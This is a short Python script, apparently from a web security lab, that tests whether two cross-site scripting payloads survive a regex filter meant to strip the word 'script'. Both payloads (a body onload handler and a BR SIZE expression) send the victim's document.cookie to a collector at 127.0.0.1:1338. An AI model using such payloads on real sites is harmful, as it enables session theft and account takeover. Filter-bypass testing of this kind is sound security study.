import re

comment = '<body onload=window.open("http://127.0.0.1:1338/xss/high?cookie=" + document.cookie)>'
comment = '<BR SIZE="&{window.open("http://127.0.0.1:1338/xss/high?cookie=" + document.cookie)}">'
print(comment)
comment = re.sub(r'<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t', '', comment, flags=re.IGNORECASE)
print(comment)
